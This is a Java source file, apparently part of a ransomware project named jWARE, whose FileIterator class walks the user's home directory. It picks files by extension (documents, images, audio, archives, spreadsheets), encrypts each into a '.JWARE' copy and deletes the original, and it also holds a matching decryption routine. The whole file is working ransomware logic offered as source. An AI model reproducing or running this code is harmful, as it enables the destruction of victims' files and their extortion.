package jWARE;

import java.io.File;
import java.io.IOException;

public class FileIterator {
	private String userDir;
    private String[] allowedExtensions = {".txt", ".pdf", ".docx", ".png", ".jpg", ".odt", ".rtf", ".doc", ".mp3", ".wav", ".zip", ".csv"};
	//private String[] allowedExtensions = { ".encryptme" }; // For debugging purposes
	
    /* Constructor for FileIterator, defines starting directory */
	FileIterator() {
		userDir = System.getProperty("user.home");
	}
	
	/* Iterates through allowedExtensions to check if filename is OK for encryption */
	boolean encryptionFilter(String filename) {
		for(String extension : allowedExtensions) 
			if(filename.contains(extension))
				return true;
			
		return false;
	}
	
	/* Checks if file is encrypted based on filename */
	boolean decryptionFilter(String filename) {
		if(filename.contains(".JWARE"))
			return true;
		
		return false;
	}
	
	/* Encrypts all files that fit the encryption filter */
	public void encryptAll(String key) {
		File[] baseDir = listAll(userDir);
		iterateAll(baseDir, true, key);
		key = null;
	}

	/* Decrypts all file that fit the decryption filter */
	public void decryptAll(String key) {
		File[] baseDir = listAll(userDir);
		iterateAll(baseDir, false, key);
		key = null;
	}
	
	/* Retrieves an array of File's from a directory, returns NULL if none */
	private File[] listAll(String dir) {
		File folder = new File(dir);
		
		if(!folder.isDirectory())
			return null;
		
		File[] listOfFiles = folder.listFiles();
		
		return listOfFiles;
	}
	
	/* Returns the file extension */
	private String getExtension(File file) {
        String name = file.getName();
        int lastIndex = name.lastIndexOf(".");
        if(lastIndex != -1)
        	return name.substring((lastIndex+1));
        
        return "";
    }
	
	/* Iterates through all files that fit conditions, then either encrypts them or decrypts based on boolean isEncrypt */
	private void iterateAll(File[] list, boolean isEncrypt, String key) {
		for (int i = 0; i < list.length; i++) {
			String itemName = list[i].getName();
			
			if (list[i].isFile() && !list[i].isHidden() && list[i].canWrite()) {
				boolean filter = false;
				if(isEncrypt)
					filter = encryptionFilter(itemName);
				else
					filter = decryptionFilter(itemName);
				
				if(filter) {
					if(isEncrypt) {
						int indexDot = list[i].getAbsolutePath().indexOf(("." + getExtension(list[i])));
						
						File newFile = new File((list[i].getAbsolutePath().substring(0, indexDot) + "." + getExtension(list[i]) + ".JWARE"));
						System.out.println((list[i].getAbsolutePath().substring(0, indexDot) + "." + getExtension(list[i]) + ".JWARE"));
						try {
							if(newFile.createNewFile()) {
								FileCrypt crypt = new FileCrypt(key, list[i], newFile);
								crypt.encryptFile();
								list[i].delete();
								crypt = null;
								System.gc();
							} else
								continue;
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					} else {
						int indexDot = list[i].getAbsolutePath().indexOf(".JWARE");
						File newFile = new File(list[i].getAbsolutePath().substring(0, indexDot));
						
						try {
							newFile.createNewFile();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						
						FileCrypt crypt = new FileCrypt(key, list[i], newFile);
						crypt.decryptFile();
						list[i].delete();
						crypt = null;
						System.gc();
					}
				}
					
			} else if (list[i].isDirectory() && !list[i].isHidden() && itemName.charAt(0) != '.' && !itemName.contains(" ")) {
				//System.out.println("Directory: " + itemName);

				File[] listAll = listAll((userDir + "/" + itemName));
				
				if(listAll == null)
					continue;
				
				iterateAll(listAll, isEncrypt, key);
			}
		}
	}
}